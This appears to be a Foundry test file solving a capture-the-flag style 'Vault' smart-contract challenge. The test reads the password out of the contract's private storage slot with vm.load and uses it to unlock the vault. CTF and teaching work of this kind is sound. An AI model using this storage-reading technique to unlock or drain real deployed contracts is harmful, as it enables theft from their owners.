pragma solidity ^0.8.0;

import {Vault} from "../src/vault/Vault.sol";
import {Test, console2} from "forge-std/Test.sol";

contract VaultTest is Test {
    Vault sc;
    function setUp() public {
        sc = new Vault(bytes32(uint256(0x22)));
    }

    function test_Hack() public {
        bytes32 password = vm.load(address(sc), bytes32(uint256(1)));
        assertEq(uint256(password), uint256(0x22));
        sc.unlock(password);
        assertEq(sc.locked(), false);
    }
}